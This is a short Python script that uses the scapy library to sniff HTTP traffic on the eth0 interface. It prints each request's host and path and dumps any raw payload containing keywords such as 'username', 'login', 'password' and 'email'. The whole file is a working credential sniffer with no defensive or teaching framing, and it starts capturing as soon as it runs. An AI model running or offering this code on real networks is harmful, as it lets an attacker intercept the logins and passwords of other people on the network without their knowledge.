import scapy.all as scapy
from scapy.layers import http

def sniffer(interface):
    scapy.sniff(iface=interface,store=False,prn=captured_packet)

def captured_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(http.HTTPRequest):
            url=(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
            print(url)
        if packet.haslayer(scapy.Raw):
            load =packet[scapy.Raw].load
            keywords=['username'.encode(),'login'.encode(),'password'.encode(),'pass'.encode(),'email'.encode(),'phone number'.encode()]
            for item in keywords:
                if item in load:
                    print(load)
                    break
           

sniffer('eth0')
